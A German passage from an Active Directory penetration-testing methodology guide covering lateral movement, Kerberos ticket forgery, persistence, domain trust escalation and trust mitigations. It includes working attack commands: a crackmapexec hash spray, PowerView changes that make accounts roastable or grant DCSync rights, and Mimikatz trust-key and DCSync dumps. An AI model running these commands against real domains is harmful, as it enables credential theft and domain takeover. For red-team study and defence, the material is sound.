Hoffentlich ist es dir gelungen, mithilfe von [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) und [lokaler Privilege Escalation](../windows-local-privilege-escalation/index.html) einen **lokalen Admin-Account zu kompromittieren**.\
Dann ist es an der Zeit, alle Hashes aus dem Speicher und lokal zu dumpen.\
[**Lies diese Seite über verschiedene Möglichkeiten, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Users hast**, kannst du ihn verwenden, um sich als dieser User **auszugeben**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung unter Verwendung** dieses **Hashes durchführt**, oder du könntest eine neue **sessionlogon** erstellen und diesen **Hash** in die **LSASS** **injizieren**, sodass bei jeder **NTLM-Authentifizierung** dieser **Hash verwendet wird**. Die letzte Option wird von mimikatz verwendet.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash des Users zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos** als Authentifizierungsprotokoll **erlaubt ist**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Users**, anstatt dessen Passwort oder Hash-Werte zu stehlen. Dieses gestohlene Ticket wird anschließend verwendet, um **sich als der User auszugeben** und unautorisierten Zugriff auf Ressourcen und Services innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrato**r hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs** anzumelden.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachten Sie, dass dies ziemlich **auffällig** ist und **LAPS** dies **abmildern** würde.

### Missbrauch von MSSQL und vertrauenswürdige Links

Wenn ein Benutzer über Berechtigungen zum **Zugriff auf MSSQL-Instanzen** verfügt, könnte er diese verwenden, um **Befehle auf dem MSSQL-Host auszuführen** (wenn dieser als SA läuft), den NetNTLM-**Hash zu stehlen** oder sogar einen **Relay**-**Angriff** durchzuführen.\
Wenn eine MSSQL-Instanz über einen Datenbank-Link von einer anderen Instanz als vertrauenswürdig eingestuft wird, kann ein Benutzer mit Berechtigungen für die verknüpfte Datenbank möglicherweise **die Vertrauensbeziehung nutzen, um Abfragen auf der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen können verkettet werden und schließlich eine falsch konfigurierte Datenbank erreichen, auf der der Benutzer Befehle ausführen kann.\
**Die Verbindungen zwischen Datenbanken funktionieren auch über Forest Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset-/Deployment-Plattformen

Drittanbieter-Suiten für Inventarisierung und Deployment bieten häufig leistungsfähige Wege zu Zugangsdaten und Codeausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn Sie ein Computer-Objekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) finden und über Domänenberechtigungen auf dem Computer verfügen, können Sie TGTs aller Benutzer aus dem Arbeitsspeicher extrahieren, die sich an diesem Computer anmelden.\
Wenn sich also ein **Domain Admin an dem Computer anmeldet**, können Sie dessen TGT extrahieren und ihn mithilfe von [Pass the Ticket](pass-the-ticket.md) imitieren.\
Dank Constrained Delegation könnten Sie sogar automatisch einen **Print Server kompromittieren** (hoffentlich handelt es sich dabei um einen DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" zugelassen ist, kann er **jeden Benutzer imitieren, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn Sie anschließend den **Hash dieses Benutzers/Computers kompromittieren**, können Sie **jeden Benutzer** (einschließlich Domain Admins) **imitieren**, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Die **WRITE**-Berechtigung für ein Active-Directory-Objekt eines Remotecomputers ermöglicht die Erlangung von Codeausführung mit **erweiterten Berechtigungen**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Missbrauch von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte über **interessante Berechtigungen für bestimmte Domänenobjekte** verfügen, die es Ihnen ermöglichen könnten, sich später **lateral zu bewegen**/**Berechtigungen zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer-Spooler-Dienstes

Das Entdecken eines **Spool-Dienstes, der innerhalb der Domäne lauscht**, kann **missbraucht** werden, um **neue Zugangsdaten zu erlangen** und **Berechtigungen zu eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, ist es möglich, **Zugangsdaten aus dem Arbeitsspeicher zu sammeln** und sogar Beacons in ihre Prozesse **zu injizieren**, um sie zu imitieren.\
Üblicherweise greifen Benutzer über RDP auf das System zu. Daher wird hier beschrieben, wie einige Angriffe auf RDP-Sitzungen Dritter durchgeführt werden:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administratorpassworts** auf domänengebundenen Computern und stellt sicher, dass es **zufällig**, eindeutig und regelmäßig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff wird über ACLs ausschließlich für autorisierte Benutzer kontrolliert. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter wird ein Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Diebstahl von Zertifikaten

Das **Sammeln von Zertifikaten** vom kompromittierten Computer könnte eine Möglichkeit sein, Berechtigungen innerhalb der Umgebung zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Missbrauch von Zertifikatvorlagen

Wenn **verwundbare Vorlagen** konfiguriert sind, ist es möglich, sie zu missbrauchen, um Berechtigungen zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-Exploitation mit einem Konto mit hohen Berechtigungen

### Auslesen von Domänenzugangsdaten

Sobald Sie **Domain-Admin-** oder noch besser **Enterprise-Admin**-Berechtigungen erhalten, können Sie die **Domänendatenbank** _ntds.dit_ **auslesen**.

[**Weitere Informationen zum DCSync-Angriff finden Sie hier**](dcsync.md).

[**Weitere Informationen zum Stehlen der NTDS.dit finden Sie hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc als Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könnten Sie:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer für [**ASREPRoast**](asreproast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Einem Benutzer [**DCSync**](#dcsync)-Berechtigungen gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver-Ticket-Angriff** erstellt mithilfe des **NTLM-Hashs** (beispielsweise des **Hashs des PC-Kontos**) ein **legitimes Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst. Diese Methode wird verwendet, um auf die **Berechtigungen des Dienstes zuzugreifen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden-Ticket-Angriff** erlangt ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active-Directory-(AD-)Umgebung. Dieses Konto ist besonders wichtig, da es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung innerhalb des AD-Netzwerks erforderlich sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für beliebige Konten erstellen (Silver-Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese ähneln Golden Tickets, werden jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence von Kontozertifikaten**

**Zertifikate eines Kontos zu besitzen oder sie anfordern zu können** ist eine sehr gute Möglichkeit, Persistence im Benutzerkonto zu gewährleisten (selbst wenn der Benutzer sein Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence von Domänenzertifikaten**

**Die Verwendung von Zertifikaten ermöglicht ebenfalls Persistence mit hohen Berechtigungen innerhalb der Domäne:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory gewährleistet die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins), indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um nicht autorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden: Wenn ein Angreifer die ACL des AdminSDHolder so ändert, dass ein regulärer Benutzer Vollzugriff erhält, erlangt dieser Benutzer weitreichende Kontrolle über alle privilegierten Gruppen. Diese eigentlich schützende Sicherheitsmaßnahme kann somit nach hinten losgehen und unbefugten Zugriff ermöglichen, sofern sie nicht sorgfältig überwacht wird.

[**Weitere Informationen zur AdminDSHolder Group finden Sie hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administratorkonto**. Wenn Sie Administratorrechte auf einem solchen Computer erlangen, kann der Hash des lokalen Administrators mit **mimikatz** extrahiert werden. Anschließend ist eine Änderung der Registry erforderlich, um **die Verwendung dieses Passworts zu aktivieren** und dadurch den Remotezugriff auf das lokale Administratorkonto zu ermöglichen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Sie könnten einem **Benutzer** bestimmte **spezielle Berechtigungen** für bestimmte Domänenobjekte **gewähren**, die es dem Benutzer ermöglichen, künftig **Berechtigungen zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Sicherheitsdeskriptoren

**Sicherheitsdeskriptoren** werden verwendet, um die **Berechtigungen zu speichern**, die ein **Objekt** für ein **Objekt** besitzt. Wenn Sie lediglich eine **kleine Änderung** am **Sicherheitsdeskriptor** eines Objekts vornehmen können, können Sie sehr interessante Berechtigungen für dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauchen Sie die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Diese löschen sich ohne Tombstones selbst und beseitigen LDAP-Spuren, hinterlassen jedoch verwaiste SIDs, defekte `gPLink`-Referenzen oder zwischengespeicherte DNS-Antworten (z. B. eine Verschmutzung von AdminSDHolder-ACEs oder bösartige Weiterleitungen über `gPCFileSysPath`/AD-integriertes DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändern Sie **LSASS** im Arbeitsspeicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domänenkonten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Hier erfahren Sie, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Sie können Ihr **eigenes SSP** erstellen, um die für den Zugriff auf den Computer verwendeten **Zugangsdaten im Klartext zu erfassen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** im AD und verwendet ihn, um **Attribute** (SIDHistory, SPNs ...) auf bestimmten Objekten zu **setzen**, ohne **Protokolle** über die **Änderungen** zu hinterlassen. Sie **benötigen DA-**Berechtigungen und müssen sich innerhalb der **Root-Domäne** befinden.\
Beachten Sie, dass bei der Verwendung falscher Daten ziemlich unschöne Protokolleinträge entstehen.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Zuvor wurde erläutert, wie Berechtigungen eskaliert werden können, wenn Sie über **ausreichende Berechtigungen zum Lesen von LAPS-Passwörtern** verfügen. Diese Passwörter können jedoch auch zur **Aufrechterhaltung von Persistence** verwendet werden.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Dies bedeutet, dass die **Kompromittierung einer einzelnen Domäne potenziell zur Kompromittierung des gesamten Forests führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Ein [**Domain Trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der es einem Benutzer aus einer **Domäne** ermöglicht, auf Ressourcen in einer anderen **Domäne** zuzugreifen. Er stellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domänen her, sodass Authentifizierungsprüfungen nahtlos weitergegeben werden können. Wenn Domänen einen Trust einrichten, tauschen sie bestimmte **Schlüssel** aus und speichern diese in ihren **Domain Controllern (DCs)**. Diese sind für die Integrität des Trusts entscheidend.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **vertrauenswürdigen Domäne** zugreifen möchte, zunächst ein spezielles Ticket namens **Inter-Realm-TGT** beim DC seiner eigenen Domäne anfordern. Dieses TGT wird mit einem gemeinsamen **Schlüssel** verschlüsselt, auf den sich beide Domänen geeinigt haben. Anschließend legt der Benutzer dieses TGT dem **DC der vertrauenswürdigen Domäne** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des Inter-Realm-TGT durch den DC der vertrauenswürdigen Domäne stellt dieser ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Clientcomputer** in **Domäne 1** startet den Vorgang, indem er seinen **NTLM-Hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert anschließend ein **Inter-Realm-TGT** von DC1 an, das für den Zugriff auf Ressourcen in **Domäne 2** benötigt wird.
4. Das Inter-Realm-TGT wird mit einem **Trust-Schlüssel** verschlüsselt, der zwischen DC1 und DC2 als Teil des bidirektionalen Domain Trusts geteilt wird.
5. Der Client übergibt das Inter-Realm-TGT an den **Domain Controller von Domäne 2 (DC2)**.
6. DC2 überprüft das Inter-Realm-TGT mithilfe des gemeinsamen Trust-Schlüssels und stellt, falls es gültig ist, einen **Ticket Granting Service (TGS)** für den Server in Domäne 2 aus, auf den der Client zugreifen möchte.
7. Schließlich legt der Client dieses TGS dem Server vor. Es ist mit dem Konto-Hash des Servers verschlüsselt, um Zugriff auf den Dienst in Domäne 2 zu erhalten.

### Verschiedene Trusts

Es ist wichtig zu beachten, dass **ein Trust unidirektional oder bidirektional** sein kann. Bei der bidirektionalen Variante vertrauen beide Domänen einander. Bei einer **unidirektionalen** Trust-Beziehung ist eine Domäne die **trusted** und die andere die **trusting** Domäne. Im letztgenannten Fall **können Sie nur aus der trusted Domäne auf Ressourcen innerhalb der trusting Domäne zugreifen**.

Wenn Domäne A Domäne B vertraut, ist A die trusting Domäne und B die trusted Domäne. Außerdem handelt es sich in **Domäne A** um einen **Outbound Trust** und in **Domäne B** um einen **Inbound Trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child Trusts**: Dies ist eine verbreitete Konfiguration innerhalb desselben Forests, bei der eine Child-Domäne automatisch einen transitiven bidirektionalen Trust zu ihrer Parent-Domäne besitzt. Dadurch können Authentifizierungsanfragen nahtlos zwischen Parent- und Child-Domäne fließen.
- **Cross-link Trusts**: Diese werden als "Shortcut Trusts" bezeichnet und zwischen Child-Domänen eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals normalerweise bis zur Forest-Root-Domäne und anschließend wieder bis zur Zieldomäne weitergeleitet werden. Durch Cross-Links wird dieser Weg verkürzt, was insbesondere in geografisch verteilten Umgebungen vorteilhaft ist.
- **External Trusts**: Diese werden zwischen unterschiedlichen, nicht verwandten Domänen eingerichtet und sind von Natur aus nicht transitiv. Laut [Microsoft-Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind externe Trusts nützlich, um auf Ressourcen in einer Domäne außerhalb des aktuellen Forests zuzugreifen, die nicht über einen Forest Trust verbunden ist. Die Sicherheit wird bei External Trusts durch SID Filtering erhöht.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domäne und einer neu hinzugefügten Tree-Root-Domäne eingerichtet. Obwohl sie nicht häufig vorkommen, sind Tree-Root Trusts wichtig, um neue Domänenbäume zu einem Forest hinzuzufügen. Dadurch können diese einen eindeutigen Domänennamen beibehalten und die bidirektionale Transitivität gewährleisten. Weitere Informationen finden Sie im [Leitfaden von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein bidirektionaler transitiver Trust zwischen den Forest-Root-Domänen zweier Forests und erzwingt ebenfalls SID Filtering zur Verbesserung der Sicherheitsmaßnahmen.
- **MIT Trusts**: Diese Trusts werden mit Nicht-Windows-Kerberos-Domänen eingerichtet, die [RFC4120-konform](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind etwas spezialisierter und für Umgebungen vorgesehen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Weitere Unterschiede bei **Trust-Beziehungen**

- Eine Trust-Beziehung kann auch **transitiv** (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht transitiv** sein.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **unidirektionaler Trust** (nur eine Domäne vertraut der anderen) eingerichtet werden.

### Angriffspfad

1. Die Trust-Beziehungen **enumerieren**
2. Prüfen, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domäne** hat, beispielsweise durch ACE-Einträge oder durch die Mitgliedschaft in Gruppen der anderen Domäne. Suchen Sie nach **domänenübergreifenden Beziehungen** (der Trust wurde vermutlich genau dafür eingerichtet).
1. Kerberoast könnte in diesem Fall eine weitere Option sein.
3. Die **Konten kompromittieren**, die ein **Pivoting** zwischen Domänen ermöglichen.

Angreifer mit Zugriff auf Ressourcen in einer anderen Domäne können drei primäre Mechanismen nutzen:

- **Mitgliedschaft in lokalen Gruppen**: Principals können lokalen Gruppen auf Computern hinzugefügt werden, beispielsweise der Gruppe "Administrators" auf einem Server, wodurch sie weitreichende Kontrolle über diesen Computer erhalten.
- **Mitgliedschaft in Gruppen einer fremden Domäne**: Principals können auch Mitglied von Gruppen innerhalb der fremden Domäne sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Wer tiefer in die Funktionsweise von ACLs, DACLs und ACEs einsteigen möchte, findet im Whitepaper "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" eine äußerst wertvolle Ressource.<sup>[[17]](#references)</sup>

### Externe Benutzer/Gruppen mit Berechtigungen finden

Sie können **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um Foreign Security Principals in der Domäne zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domäne/einem externen Forest**.

Sie können dies in **Bloodhound** oder mit powerview überprüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten, Domänenvertrauensstellungen zu enumerieren:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 vertrauenswürdige Schlüssel**, einen für _Child --> Parent_ und einen weiteren für _Parent_ --> _Child_.\
> Sie können den vom aktuellen Domain verwendeten Schlüssel mit folgenden Befehlen abrufen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin in die Child-/Parent-Domain eskalieren, indem die Trust-Beziehung mit SID-History injection missbraucht wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Ausnutzung einer beschreibbaren Configuration NC

Das Verständnis, wie die Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Die Configuration NC dient als zentrales Repository für Konfigurationsdaten in einer Forest in Active Directory (AD)-Umgebungen. Diese Daten werden auf jeden Domain Controller (DC) innerhalb der Forest repliziert, wobei beschreibbare DCs eine beschreibbare Kopie der Configuration NC verwalten. Für die Ausnutzung benötigt man **SYSTEM-Rechte auf einem DC**, vorzugsweise einem Child DC.

**GPO mit der Root-DC-Site verknüpfen**

Der Sites-Container der Configuration NC enthält Informationen zu den Sites aller in die Domain eingebundenen Computer innerhalb der AD-Forest. Mit SYSTEM-Rechten auf einem beliebigen DC können Angreifer GPOs mit den Root-DC-Sites verknüpfen. Dadurch wird die Root-Domain möglicherweise kompromittiert, indem die auf diese Sites angewendeten Policies manipuliert werden.

Für ausführliche Informationen kann man die Forschung zu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) heranziehen.<sup>[[12]](#references)</sup>

**Beliebige gMSA in der Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs erforderlich ist, wird in der Configuration NC gespeichert. Mit SYSTEM-Rechten auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter jeder gMSA in der gesamten Forest zu berechnen.

Eine detaillierte Analyse und schrittweise Anleitung finden sich unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegierter MSA-Angriff (BadSuccessor – Missbrauch von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-Change-Angriff**

Diese Methode erfordert Geduld, da auf die Erstellung neuer privilegierter AD-Objekte gewartet werden muss. Mit SYSTEM-Rechten kann ein Angreifer das AD-Schema so ändern, dass jeder Benutzer vollständige Kontrolle über alle Klassen erhält. Dies kann zu unbefugtem Zugriff auf und Kontrolle über neu erstellte AD-Objekte führen.

Weitere Informationen sind unter [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) verfügbar.<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Public-Key-Infrastructure-(PKI-)Objekte ab, um ein certificate template zu erstellen, das die Authentifizierung als beliebiger Benutzer innerhalb der Forest ermöglicht. Da sich PKI-Objekte in der Configuration NC befinden, ermöglicht die Kompromittierung eines beschreibbaren Child DC die Ausführung von ESC5-Angriffen.

Weitere Details finden sich unter [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In Szenarien ohne ADCS kann der Angreifer die erforderlichen Komponenten einrichten, wie unter [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externe Forest-Domain – Unidirektional (Inbound) oder bidirektional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario wird **Ihre Domäne** von einer externen Domäne **als vertrauenswürdig eingestuft**, wodurch Sie **unbestimmte Berechtigungen** für diese erhalten. Sie müssen herausfinden, **welche Principals Ihrer Domäne welchen Zugriff auf die externe Domäne haben**, und anschließend versuchen, diesen auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne – Einseitig (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario **vertraut Ihre Domain** einem Prinzipal aus **einer anderen Domain** bestimmte **Berechtigungen** an.

Wenn jedoch eine **Domain von der vertrauenden Domain als vertrauenswürdig eingestuft wird**, erstellt die vertrauenswürdige Domain **einen Benutzer** mit einem **vorhersehbaren Namen**, der als **Passwort das Passwort der vertrauenswürdigen Domain** verwendet. Dadurch ist es möglich, **auf einen Benutzer aus der vertrauenden Domain zuzugreifen, um in die vertrauenswürdige Domain zu gelangen**, sie zu enumerieren und zu versuchen, weitere Berechtigungen zu erlangen:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** des Domain Trusts erstellt wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf der sich **ein Benutzer aus der vertrauenswürdigen Domain anmelden kann**, um sich über **RDP** anzumelden. Anschließend könnte der Angreifer Code in den Prozess der RDP-Sitzung injizieren und von dort aus **auf die Ursprungsdomain des Opfers zugreifen**.\
Wenn das **Opfer außerdem seine Festplatte eingebunden hat**, könnte der Angreifer aus dem Prozess der **RDP-Sitzung** **Backdoors** im **Startup-Ordner der Festplatte** ablegen. Diese Technik wird **RDPInception** genannt.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen zur Abwehr des Missbrauchs von Domain Trusts

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-History-Attribut über Forest Trusts hinweg ausnutzen, wird durch SID Filtering reduziert, das standardmäßig auf allen Inter-Forest Trusts aktiviert ist. Dies basiert auf der Annahme, dass Intra-Forest Trusts sicher sind, wobei gemäß Microsofts Einschätzung der Forest und nicht die Domain die Sicherheitsgrenze darstellt.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Inter-Forest Trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der vertrauenden Domain oder des vertrauenden Forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen weder vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) noch vor Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domain Trusts bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-basierter AD-Missbrauch durch On-Host-Implants

